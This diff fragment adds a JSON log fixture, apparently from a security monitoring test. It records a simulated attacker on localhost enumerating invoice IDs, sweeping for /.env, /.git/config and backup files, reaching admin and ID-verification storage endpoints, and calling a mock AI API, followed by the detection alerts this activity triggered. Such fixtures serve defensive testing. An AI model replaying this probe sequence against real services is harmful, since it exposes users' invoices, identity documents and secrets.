+      "ip": "127.0.0.1",
+      "method": "POST",
+      "path": "/auth/v1/signup",
+      "status": 200,
+      "ms": 21,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.722Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.730Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4211",
+      "status": 200,
+      "ms": 1,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.740Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4192",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.746Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4193",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.752Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4194",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.758Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4195",
+      "status": 200,
+      "ms": 1,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.763Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4196",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.769Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4197",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.774Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4198",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.780Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4199",
+      "status": 200,
+      "ms": 1,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.785Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4200",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.790Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4201",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.796Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4202",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.801Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4203",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.806Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4204",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.812Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4205",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.817Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4206",
+      "status": 200,
+      "ms": 1,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.823Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4207",
+      "status": 200,
+      "ms": 1,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.828Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4208",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.833Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4209",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.838Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4210",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.843Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/invoices/4211",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.851Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/.env",
+      "status": 404,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.856Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/.git/config",
+      "status": 404,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.862Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/backup.zip",
+      "status": 404,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.867Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/wp-login.php",
+      "status": 404,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.872Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/swagger.json",
+      "status": 404,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.878Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/admin",
+      "status": 200,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.884Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/admin",
+      "status": 401,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.889Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/docs",
+      "status": 200,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.896Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/openapi.json",
+      "status": 200,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.903Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/api/admin/users?limit=3",
+      "status": 200,
+      "ms": 0,
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.910Z",
+      "ip": "127.0.0.1",
+      "method": "POST",
+      "path": "/storage/v1/object/list/id-verification",
+      "status": 200,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.918Z",
+      "ip": "127.0.0.1",
+      "method": "POST",
+      "path": "/storage/v1/object/list/id-verification",
+      "status": 200,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.925Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/storage/v1/object/public/id-verification/ec011f15-fd5f-4524-b1c8-0144dca72a38/id-front.svg",
+      "status": 200,
+      "ms": 1,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.932Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/storage/v1/object/public/id-verification/ec011f15-fd5f-4524-b1c8-0144dca72a38/id-front.svg",
+      "status": 200,
+      "ms": 1,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.941Z",
+      "ip": "127.0.0.1",
+      "method": "POST",
+      "path": "/mock-ai/v1/chat/completions",
+      "status": 200,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.949Z",
+      "ip": "127.0.0.1",
+      "method": "POST",
+      "path": "/mock-ai/v1/chat/completions",
+      "status": 200,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.955Z",
+      "ip": "127.0.0.1",
+      "method": "POST",
+      "path": "/mock-ai/v1/chat/completions",
+      "status": 200,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.960Z",
+      "ip": "127.0.0.1",
+      "method": "POST",
+      "path": "/mock-ai/v1/chat/completions",
+      "status": 200,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.966Z",
+      "ip": "127.0.0.1",
+      "method": "POST",
+      "path": "/mock-ai/v1/chat/completions",
+      "status": 200,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.972Z",
+      "ip": "127.0.0.1",
+      "method": "POST",
+      "path": "/mock-ai/v1/chat/completions",
+      "status": 200,
+      "ms": 1,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    }
+  ],
+  "alerts": [
+    {
+      "time": "2026-11-03T01:11:30.683Z",
+      "alert": "canary",
+      "ip": "127.0.0.1",
+      "user": "anon",
+      "ua": "curl/8.7.1",
+      "detail": "canary row finance-ops@tallybird.example was returned by GET /rest/v1/profiles"
+    },
+    {
+      "time": "2026-11-03T01:11:30.785Z",
+      "alert": "enumeration",
+      "ip": "127.0.0.1",
+      "user": "attacker@example.com",
+      "ua": "curl/8.7.1",
+      "detail": "10 different invoice ids in 60s"
+    },
+    {
+      "time": "2026-11-03T01:11:30.872Z",
+      "alert": "enumeration",
+      "ip": "127.0.0.1",
+      "user": "anon",
+      "ua": "curl/8.7.1",
+      "detail": "5 not-found paths in 60s (path sweep)"
+    },
+    {
+      "time": "2026-11-03T01:11:30.966Z",
+      "alert": "ai_spend",
+      "ip": "127.0.0.1",
+      "user": "anon",
+      "ua": "curl/8.7.1",
+      "detail": "5 AI calls in 60s on one key, $0.0030 today"
+    }
+  ]
+}
